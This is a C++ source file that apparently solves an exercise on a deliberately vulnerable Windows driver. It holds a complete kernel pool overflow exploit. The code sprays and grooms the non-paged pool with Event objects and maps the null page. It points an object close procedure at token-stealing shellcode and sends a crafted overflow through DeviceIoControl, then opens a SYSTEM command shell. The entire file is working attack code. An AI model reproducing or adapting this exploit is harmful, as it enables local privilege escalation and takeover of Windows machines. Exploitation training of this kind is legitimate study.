#include <Windows.h>
#include <iostream>
#include <vector>

#include "Solutions.h"
#include "utils.h"
#include "NonPagedPoolOverflow.h"

NTSTATUS Solutions::TriggerNonPagedPoolOverflow() {
	PCHAR lpInBuffer = 0;
	DWORD dwBufLen = OVERFLOW_OFFSET + PAYLOAD_SIZE;
	DWORD dwBytesReturned = 0;

	// spray heap to allocate "Hack" object between Event objects
	HeapSprayEventObject();

	lpInBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufLen);
	if (!lpInBuffer) {
		std::cout << "[!] Could not allocate buffer" << std::endl;
		return STATUS_NO_MEMORY;
	}
	RtlFillMemory(lpInBuffer, OVERFLOW_OFFSET, 0x41);

	allocate_null_page(0x1000);
	std::cout << "[+] Allocated null paged" << std::endl;

	// put shellcode pointer in null page + 0x60
	*(PULONG)(CLOSE_PROCEDURE_OFFSET) = (ULONG)(&token_stealing_shellcode_write_what_where);
	std::cout << "[+] Copied shellcode to null page: " << std::hex << &token_stealing_shellcode_write_what_where << std::endl;

	PBYTE payload = GetNonPagedPoolOverflowPayload();
	RtlCopyMemory(lpInBuffer + OVERFLOW_OFFSET, payload, PAYLOAD_SIZE);
	std::cout << "[+] Copied payload to buffer" << std::endl;

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NON_PAGED_POOL_OVERFLOW,
		lpInBuffer, dwBufLen, NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[!] Could not interact with the driver - " << GetLastError() << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	
	std::cout << "[+] Closing handles, Enjoy shell" << std::endl;
	CleanEventHandles();

	system("cmd.exe");

	return 0;
}

static NTSTATUS HeapSprayEventObject() {
	std::cout << "[+] Started derandomizing nonPagedPool" << std::endl;
	for (int i = 0; i < 10000; i++) {
		HANDLE tmpEvent = CreateEventA(NULL, FALSE, FALSE, "");
		first.push_back(tmpEvent);
	}

	std::cout << "[+] Allocating sequantial objects " << std::endl;
	for (int i = 0; i < 6000; i++) {
		HANDLE tmpEvent = CreateEventA(NULL, FALSE, FALSE, "");
		second.push_back(tmpEvent);
		
		if (i >= 5990) {
			std::cout << "[+] handle: " << std::hex << tmpEvent << std::endl;
		}
	}

	std::cout << "[+] Creating holes in sizes 0x200..." << std::endl;
	for (int i = 0; i < second.size(); i+=16) {
		for (int j = 0; j < 8; j++) {
			CloseHandle(second[i + j]);
		}
	}

	return 0;
}

static PBYTE GetNonPagedPoolOverflowPayload() {
	BYTE payload[] = "\x40\x00\x08\x04" 
		"\x45\x76\x65\xee" // pool tag
		"\x00\x00\x00\x00" 
		"\x40\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x01\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00"; // overwrite array index

	return payload;
}

static VOID CleanEventHandles() {
	for(HANDLE hEvent : first) {
		CloseHandle(hEvent);
	}

	for (int i = 8; i < second.size(); i+=16) {
		for (int j = 0; j < 8; j++) {
			CloseHandle(second[i + j]);
		}
	}
}